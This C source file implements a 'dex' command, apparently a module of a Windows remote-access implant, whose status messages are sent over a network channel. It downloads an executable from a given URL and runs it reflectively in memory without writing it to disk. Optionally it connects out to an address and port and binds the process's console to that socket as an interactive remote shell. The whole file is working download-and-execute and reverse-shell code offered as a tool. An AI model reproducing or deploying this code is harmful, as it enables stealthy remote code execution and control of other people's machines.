#include <stdio.h>

#include "command.h"
#include "dex.h"
#include "networking.h"
#include "pe.h"
#include "process.h"
#include "utils.h"

// Returns 0 on success, else error.
static void PrintHelp(void) {
	NetSend(L"\t\t.:: DEX HELP ::.\n\n"
			L"Usage: dex [help|interactive] [address port] <URL> [COMMAND LINE ARGUMENTS]\n\n"
			L"\t%-12s:\tDisplay this menu.\n"
			L"\t%-12s:\tEnables console interaction over the network. The executable must be a console application.\n\n"
			L"\t%-12s:\tDirect link to the file to be downloaded and executed. URLs must start with \"ftp:\" or \"http(s):\".\n\n"
			L"Examples:\n"
			L"\tdex https://host.com/app.exe -a my -b args\n"
			L"\tdex interactive 127.0.0.1 9000 https://host.com/consoleapp.exe -a my -b args\n\n"
			L"Notes:\n"
			L"\t> Please use the arguments in the order mentioned above.\n\n"
			L"WARNINGS:\n"
			L"\t> Be cautious of executing files which write to disk.\n\n",
			OPTION_STRING_HELP,
			OPTION_STRING_INTERACTIVE,
			L"URL");
}

static void DexNetSend(LPCWSTR fmt, ...) {
	WCHAR szBuf[NET_BUF_SIZE + 1];
	va_list args;

	ZeroMemory(szBuf, SIZEOF_ARRAY(szBuf));

	va_start(args, fmt);
	_vswprintf_p(szBuf, SIZEOF_ARRAY(szBuf) - sizeof(WCHAR), fmt, args);

	NetSend(L"%s: %s\n", DEX_BANNER, szBuf);
}

void DexStart(LPVOID lpParameter) {
	LPDEX_THREAD_ARGS dta = (LPDEX_THREAD_ARGS)lpParameter;

	LPBYTE lpDownloaded = NULL;
	SIZE_T nSize = 0;

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	ULONG uError = FileDownload(dta->szUrl, &lpDownloaded, &nSize);
	if (uError != ERROR_SUCCESS) {
		DexNetSend(L"Failed to download file; error: %lu", uError);
		if (dta->dAction == DEX_INTERACTIVE) {
			free(dta->lpAddress);
			free(dta->lpPort);
		}
		free(dta->szUrl);
		if (dta->lpArguments != NULL) {
			_HeapFree(dta->lpArguments);
		}
		_HeapFree(dta);
		return;
	}

	if (dta->dAction == DEX_INTERACTIVE) {
		// Check if console application.
		if (PeIsConsoleApplication(lpDownloaded) == FALSE) {
			DexNetSend(L"Interactive sessions are only available for console applications.");
			goto fail;
		}

		SOCKET s = INVALID_SOCKET;
		uError = TcpConnect(&s, dta->lpAddress, dta->lpPort);
		if (uError) {
			DexNetSend(L"Failed to create a TCP connection; error: %lu", uError);

			if (uError != WSAETIMEDOUT && uError != WSAECONNREFUSED) {
				if (s != INVALID_SOCKET) {
					CloseTcpSocket(s);
					goto fail;
				}
			}
		}

		uError = ProcessCreateInteractiveSocketShellReflective(s, lpDownloaded, dta->lpArguments, &pi);

		if (uError == 0) {
			DexNetSend(L"Successfully spawned interactive process (PID: <0x%08x>).", GetProcessId(pi.hProcess));
		} else {
			DexNetSend(L"Failed to spawn interactive process; error: %lu", GetLastError());
		}

		WaitForSingleObject(pi.hProcess, INFINITE);

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		CloseTcpSocket(s);
fail:
		free(dta->lpAddress);
		free(dta->lpPort);
	} else {
		uError = ProcessCreateReflective(lpDownloaded, dta->lpArguments, &pi);

		WaitForSingleObject(pi.hProcess, INFINITE);

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}

	_HeapFree(lpDownloaded);
	free(dta->szUrl);
	if (dta->lpArguments != NULL) {
		_HeapFree(dta->lpArguments);
	}
	_HeapFree(dta);

	return;
}

ULONG DexMain(INT argc, LPWSTR *argv) {
	if (argc < 2) {
		PrintHelp();
	} else if (argc >= 2) {
		if (!_wcsnicmp(argv[1], OPTION_STRING_HELP, wcslen(OPTION_STRING_HELP))) {
			PrintHelp();
		} else {
			// Allocate thread arguments. To be freed by callee.
			LPDEX_THREAD_ARGS dta = _HeapAlloc(HEAP_ZERO_MEMORY, sizeof(*dta));
			if (dta == NULL) {
				DexNetSend(L"Failed to allocate memory for thread arguments; error: %lu", GetLastError());
				return 1;
			}

			if (!_wcsnicmp(argv[1], OPTION_STRING_INTERACTIVE, wcslen(OPTION_STRING_INTERACTIVE))) {
				// dex interactive address port URL [args]
				dta->dAction = DEX_INTERACTIVE;
				// Freed by callee.
				dta->lpAddress = _wcsdup(argv[2]);
				dta->lpPort = _wcsdup(argv[3]);
				dta->szUrl = _wcsdup(argv[4]);

				// Calculate the string length of args.
				SIZE_T nLen = 0;
				for (INT i = 5; i < argc; i++) {
					// String length of arg i
					nLen += wcslen(argv[i]);
					// Need a space too!
					nLen++;
				}
				// Don't forget to add 1 for NULL terminator.
				nLen++;

				// Allocate a string on the heap.
				// Freed by callee.
				dta->lpArguments = _HeapAlloc(HEAP_ZERO_MEMORY, nLen * sizeof(WCHAR));
				if (dta->lpArguments == NULL) {
					DexNetSend(L"Failed to allocate memory for arguments; error: %lu", GetLastError());
					return 1;
				}

				// Combine the strings.
				for (INT i = 5; i < argc; i++) {
					wcsncat_s(dta->lpArguments, nLen, argv[i], _TRUNCATE);
					if ((i + 1) == argc) {
						// Need this to not append the space.
						break;
					}
					wcsncat_s(dta->lpArguments, nLen, L" ", _TRUNCATE);
				}

				if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DexStart, (LPVOID)dta, 0, NULL) == FALSE) {
					DexNetSend(L"Failed to create DexStart thread; error: %lu", GetLastError());
					return 1;
				}
			} else {
				// dex URL [args]
				dta->dAction = DEX_NON_INTERACTIVE;
				// Freed by callee.
				dta->szUrl = _wcsdup(argv[1]);

				// Calculate the string length of args.
				SIZE_T nLen = 0;
				for (INT i = 2; i < argc; i++) {
					// String length of arg i
					nLen += wcslen(argv[i]);
					// Need a space too!
					nLen++;
				}
				// Don't forget to add 1 for NULL terminator.
				nLen++;

				// Allocate a string on the heap.
				// Freed by callee.
				dta->lpArguments = _HeapAlloc(HEAP_ZERO_MEMORY, nLen * sizeof(WCHAR));
				if (dta->lpArguments == NULL) {
					DexNetSend(L"Failed to allocate memory for arguments; error: %lu", GetLastError());
					return 1;
				}

				// Combine the strings.
				for (INT i = 2; i < argc; i++) {
					wcsncat_s(dta->lpArguments, nLen, argv[i], _TRUNCATE);
					if ((i + 1) == argc) {
						// Need this to not append the space.
						break;
					}
					wcsncat_s(dta->lpArguments, nLen, L" ", _TRUNCATE);
				}

				if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DexStart, (LPVOID)dta, 0, NULL) == FALSE) {
					DexNetSend(L"Failed to create DexStart thread; error: %lu", GetLastError());
					return 1;
				}
			}
		}
	}

	return 0;
}